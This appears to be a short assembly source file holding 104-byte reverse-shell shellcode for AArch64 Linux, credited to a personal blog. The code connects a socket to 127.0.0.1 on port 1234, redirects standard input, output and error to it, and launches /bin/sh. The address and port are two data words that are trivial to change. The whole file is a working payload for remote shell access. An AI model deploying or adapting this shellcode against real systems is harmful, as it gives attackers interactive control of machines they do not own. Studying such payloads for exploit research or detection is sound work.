/**
  reverse connect shell to 127.0.0.1:1234
  tested with ubuntu/AArch64
  
  http://modexp.wordpress.com/   
*/

// 104 bytes
    .global _start
    .text

_start:
    // s = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
    eor    x2, x2, x2  // x2 = IPPROTO_IP
    mov    x1, #1      // x1 = SOCK_STREAM
    mov    x0, #2      // x0 = AF_INET
    mov    x8, #198    // x8 = socket 
    svc    0
  
    // connect(s, &sa, sizeof(sa));
    mov    x6, x0       // x6 = s
    adr    x1, sin_port // x1 = sa.sin_port
    mov    x2, #16      // x2 = sizeof(sa)
    mov    x8, #203     // x8 = connect
    svc    0
  
    // dup2(s, FILENO_STDIN);
    // dup2(s, FILENO_STDOUT);
    // dup2(s, FILENO_STDERR);
    mov    x1, #2        // for 3 descriptors
dup_loop:
    eor    x2, x2, x2    // x2 = 0
    mov    x0, x6        // x0 = s
    mov    x8, #24       // x8 = dup2 
    svc    0
    subs   x1, x1, #1    // subtract 1
    bpl    dup_loop

    // execve("/bin/sh", NULL, NULL);
    adr    x0, sh        // x0 = "/bin/sh" 
    eor    x2, x2, x2    // x2 = NULL
    eor    x1, x1, x1    // x1 = NULL  
    mov    x8, #221      // x8 = execve
    svc    0
sin_port:    
    .word  0xd2040002    // 1234, AF_INET
sin_addr:
    .word  0x0100007f    // 127.0.0.1
sh:  
    .ascii "/bin/sh\0"

